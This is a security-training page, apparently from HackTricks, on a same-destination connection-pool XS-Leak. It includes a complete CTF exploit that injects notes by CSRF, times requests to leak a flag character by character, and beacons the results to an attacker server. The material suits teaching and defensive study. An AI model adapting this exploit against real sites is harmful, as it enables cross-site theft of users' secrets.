@@ -1,0 +1,141 @@
+# Connection Pool by Destination Example
+
+{{#include ../../banners/hacktricks-training.md}}
+
+In [**this exploit**](https://gist.github.com/terjanq/0bc49a8ef52b0e896fca1ceb6ca6b00e#file-safelist-html), [**@terjanq**](https://twitter.com/terjanq) proposes yet another solution for the challenge mentioned in the following page:<sup>[[2]](#references)</sup><sup>[[3]](#references)</sup>
+
+{{#ref}}
+connection-pool-example.md
+{{#endref}}
+
+Let's see how this exploit works:
+
+- The attacker injects a note with as many **`<img`** tags **loading** **`/js/purify.js`** as possible (more than 6 requests to saturate that destination queue).
+- Then, the attacker **removes** the **note** with index 1.
+- Finally, the attacker sends a **timed request** to **`victim.com/js/purify.js`**.
+  - If the timed request is **slower**, the **injected note** was the one left and its **`<img>`** tags are still competing for the same destination.
+  - If the timed request is **faster**, the **flag note** was left instead.
+
+> [!NOTE]
+> The exploit does not need an extra explicit navigation step because the **form submissions already open target-origin responses in auxiliary windows** (`target="xxx"` and `target="_blank"`). If the surviving note is the injected one, those responses render the note and the browser starts fetching the embedded **`/js/purify.js?...`** images, which is exactly what the final timed `<script>` request races against.
+
+## Why this variant is useful
+
+This is **not** the classic "block 255 global sockets and measure the 256th" trick.<sup>[[1]](#references)</sup> The oracle here is much narrower: the attacker only cares about the **per-destination contention** for requests going to the **same origin/resource bucket**.
+
+That makes this variant useful in scenarios where the attacker can get **HTML rendered inside the victim origin** (for example via HTML injection plus CSRF), because:
+
+- browser mitigations against the old **global** connection-pool oracle do **not automatically kill** a same-destination queue inside the victim context,
+- the attacker can make the victim page itself generate the competing requests, and
+- the probe can be reduced to a **single timed request** to the exact resource the injected markup is loading.
+
+## Practical notes
+
+- The **random query string** in `purify.js?${Math.random()}` is important to avoid hitting a warm cache and accidentally removing the timing signal.
+- In practice, you want the **probe** and the **victim-generated requests** to share the same network bucket as much as possible: same **scheme**, **host**, **port**, and usually the same request destination.
+- The exploit uses a dynamically created **`<script>`** element as the timer. This is a practical detail: other request primitives such as **`fetch()`** may not always contend in exactly the same way as parser-driven subresource loads, so when reproducing this technique it is worth testing several request types.
+- Modern browsers have made the **global** connection-pool attack less reliable via partitioning and related mitigations, but this **same-destination** variant can still matter when attacker-controlled markup is rendered by the target site and both flows stay inside the same partition.
+
+```html
+<html>
+  <head>
+    <script>
+      const SITE_URL = "https://safelist.ctf.sekai.team/"
+      const PING_URL = "https://myserver"
+      function timeScript() {
+        return new Promise((resolve) => {
+          var x = document.createElement("script")
+          x.src =
+            "https://safelist.ctf.sekai.team/js/purify.js?" + Math.random()
+          var start = Date.now()
+          x.onerror = () => {
+            console.log(`Time: ${Date.now() - start}`) //Time request
+            resolve(Date.now() - start)
+            x.remove()
+          }
+          document.body.appendChild(x)
+        })
+      }
+
+      add_note = async (note) => {
+        let x = document.createElement("form")
+        x.action = SITE_URL + "create"
+        x.method = "POST"
+        x.target = "xxx"
+
+        let i = document.createElement("input")
+        i.type = "text"
+        i.name = "text"
+        i.value = note
+        x.appendChild(i)
+        document.body.appendChild(x)
+        x.submit()
+      }
+
+      remove_note = async (note_id) => {
+        let x = document.createElement("form")
+        x.action = SITE_URL + "remove"
+        x.method = "POST"
+        x.target = "_blank"
+
+        let i = document.createElement("input")
+        i.type = "text"
+        i.name = "index"
+        i.value = note_id
+        x.appendChild(i)
+        document.body.appendChild(x)
+        x.submit()
+      }
+
+      const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms))
+      // }zyxwvutsrqponmlkjihgfedcba_
+      const alphabet = "zyxwvutsrqponmlkjihgfedcba_"
+      var prefix = "SEKAI{xsleakyay"
+      const TIMEOUT = 500
+      async function checkLetter(letter) {
+        // Chrome puts a limit of 6 concurrent request to the same origin. We are creating a lot of images pointing to purify.js
+        // Depending whether we found flag's letter it will either load the images or not.
+        // With timing, we can detect whether Chrome is processing purify.js or not from our site and hence leak the flag char by char.
+        const payload =
+          `${prefix}${letter}` +
+          Array.from(Array(78))
+            .map((e, i) => `<img/src=/js/purify.js?${i}>`)
+            .join("")
+        await add_note(payload)
+        await sleep(TIMEOUT)
+        await timeScript()
+        await remove_note(1) //Now, only the note with the flag or with the injection exists
+        await sleep(TIMEOUT)
+        const time = await timeScript() //Find out how much a request to the same origin takes
+        navigator.sendBeacon(PING_URL, [letter, time])
+        if (time > 100) {
+          return 1
+        }
+        return 0
+      }
+      window.onload = async () => {
+        navigator.sendBeacon(PING_URL, "start")
+        // Does not work because we remove the flag after success.
+        // while(1){
+        for (const letter of alphabet) {
+          if (await checkLetter(letter)) {
+            prefix += letter
+            navigator.sendBeacon(PING_URL, prefix)
+            break
+          }
+        }
+        // }
+      }
+    </script>
+  </head>
+  <body></body>
+</html>
+```
+
+## References
+
+- [1] [XS-Leaks Wiki - Connection Pool](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
+- [2] [terjanq - safelist.html gist (SekaiCTF 2022 challenge exploit)](https://gist.github.com/terjanq/0bc49a8ef52b0e896fca1ceb6ca6b00e#file-safelist-html)
+- [3] [Huli - SekaiCTF 2022 - safelist writeup](https://blog.huli.tw/2022/10/05/en/sekaictf2022-safelist-xsleak/)
+
+{{#include ../../banners/hacktricks-training.md}}
